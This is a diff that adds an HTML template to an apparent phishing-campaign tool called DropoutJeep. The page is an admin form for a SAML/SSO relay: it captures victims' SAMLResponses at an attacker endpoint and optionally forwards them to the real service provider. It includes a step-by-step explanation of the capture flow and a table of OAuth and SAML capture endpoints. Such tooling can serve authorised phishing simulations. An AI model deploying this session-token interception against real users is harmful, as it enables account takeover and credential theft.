@@ -1,0 +1,90 @@
+{% extends "base.html" %}
+{% block content %}
+<div class="max-w-5xl mx-auto py-8">
+
+  <!-- Navigation Back Link -->
+  <div class="mb-6 font-mono-brutal">
+    <a href="{{ url_for('campaigns_admin.admin_campaign_info', cid=campaign.id) }}" class="inline-flex items-center text-xs font-bold text-gray-700 dark:text-gray-300 hover:text-pure-black dark:hover:text-stark-white transition-colors">
+      <svg class="w-4 h-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M15 19l-7-7 7-7"/></svg>
+      [ BACK TO CAMPAIGN INFO ]
+    </a>
+  </div>
+
+  <div class="flex items-center justify-between mb-6">
+    <h1 class="text-3xl font-extrabold font-mono-brutal">SAML/SSO RELAY CONFIG</h1>
+    <div class="flex gap-3">
+      <a href="{{ url_for('campaigns_admin.admin_saml_config', cid=campaign.id) }}" class="brutal-btn-black px-4 py-2 text-sm">SAML CONFIG</a>
+      <a href="{{ url_for('campaigns_admin.admin_campaign_info', cid=campaign.id) }}" class="brutal-btn-white px-4 py-2 text-sm">CAMPAIGN INFO</a>
+    </div>
+  </div>
+
+  <div class="brutal-card p-6 mb-6">
+    <h2 class="text-xl font-bold font-mono-brutal mb-2">{{ campaign.name }}</h2>
+    <p class="text-sm font-mono-brutal text-gray-600 dark:text-gray-400">
+      Configure the SAML/SSO relay flow. When a victim submits a SAMLResponse to the
+      <code>/saml/acs/&lt;token&gt;</code> endpoint, it is captured for analysis.
+      Optionally, it can be forwarded to the real service provider ACS to establish a session.
+    </p>
+  </div>
+
+  <div class="brutal-card p-6 mb-8">
+    <form method="post" action="{{ url_for('campaigns_admin.admin_saml_config', cid=campaign.id) }}" class="space-y-4">
+      <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
+
+      <div>
+        <label class="block font-mono-brutal text-sm font-bold mb-1">Real ACS URL (Optional)</label>
+        <input type="url" name="real_acs_url" value="{{ saml_cfg.get('real_acs_url', '') }}"
+               placeholder="https://app.example.com/saml/acs"
+               class="w-full p-2 border-2 border-pure-black focus:outline-none font-mono text-sm">
+        <p class="text-xs text-gray-500 mt-1">
+          If set, captured SAMLResponses will be automatically relayed to this URL so the victim's session
+          is established. Leave blank to capture-only mode (no relay).
+        </p>
+      </div>
+
+      <div class="bg-off-white dark:bg-black border-2 border-gray-300 dark:border-gray-700 p-4">
+        <h3 class="font-mono-brutal text-sm font-bold mb-2">How SAML Relay Works</h3>
+        <ol class="list-decimal list-inside text-xs font-mono-brutal space-y-1 text-gray-600 dark:text-gray-400">
+          <li>Victim is redirected to the real IdP login page via your phishing email link.</li>
+          <li>After authentication, the IdP POSTs a SAMLResponse to your <code>/saml/acs/&lt;token&gt;</code> endpoint.</li>
+          <li>DropoutJeep captures the SAMLResponse, RelayState, and metadata.</li>
+          <li>If <strong>Real ACS URL</strong> is set, the SAMLResponse is forwarded to the real SP so the victim gets a valid session.</li>
+          <li>You can review captured SAML responses in the <strong>VIEW CAPTURES</strong> page.</li>
+        </ol>
+      </div>
+
+      <div class="flex gap-3 pt-2">
+        <button type="submit" class="brutal-btn-black px-6 py-2">SAVE SAML CONFIG</button>
+        <a href="{{ url_for('campaigns_admin.admin_saml_captures', cid=campaign.id) }}"
+           class="brutal-btn-white px-6 py-2">VIEW CAPTURED RESPONSES</a>
+      </div>
+    </form>
+  </div>
+
+  <div class="brutal-card p-6">
+    <h3 class="text-lg font-bold font-mono-brutal mb-3">Endpoint Reference</h3>
+    <table class="w-full text-sm font-mono-brutal">
+      <thead class="border-b-2 border-pure-black dark:border-stark-white">
+        <tr>
+          <th class="text-left py-2">Purpose</th>
+          <th class="text-left py-2">URL</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr class="border-b border-gray-300 dark:border-gray-700">
+          <td class="py-2">SAML ACS (capture endpoint)</td>
+          <td class="py-2 font-mono text-xs break-all">{{ base_url }}/saml/acs/{{ campaign.id }}-TOKEN</td>
+        </tr>
+        <tr class="border-b border-gray-300 dark:border-gray-700">
+          <td class="py-2">OAuth Start</td>
+          <td class="py-2 font-mono text-xs break-all">{{ base_url }}/oauth/start/{{ campaign.id }}-TOKEN</td>
+        </tr>
+        <tr>
+          <td class="py-2">OAuth Callback</td>
+          <td class="py-2 font-mono text-xs break-all">{{ base_url }}/oauth/callback</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+{% endblock %}
